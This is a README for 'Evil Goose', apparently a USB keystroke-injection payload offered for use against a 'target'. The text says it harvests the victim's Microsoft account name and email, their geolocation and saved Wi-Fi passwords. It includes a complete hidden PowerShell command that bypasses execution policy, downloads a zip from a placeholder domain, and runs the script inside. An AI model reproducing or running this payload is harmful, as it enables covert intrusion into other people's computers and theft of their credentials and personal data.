##

<!-- TABLE OF CONTENTS -->
<!--TABLE 0F C0NTENTS-->

# Evil Goose

A payload that hires a goose to hack your target in real time

## Description

With this payload after is is executed it will wait for a mouse movement to begin 

Afterwards it will walk around your targets screen pulling out personal information about them such as: 

* Full name associated with their microsoft account 
* Email associated with their microsoft account 
* Their exact Geo Location 
* The wifi networks and passwords

## Getting Started

### Dependencies

* Windows 10,11

##

### Executing program

* Plug in your device
* 10 seconds later your goose is owning their system

```powershell
powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://MYDOMAIN.HERE/1ae' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
```
### Exiting the Payload

This payload will automatically end after 2 min 

Or if you press `Left Control` + `Right Control` at the same time

##

##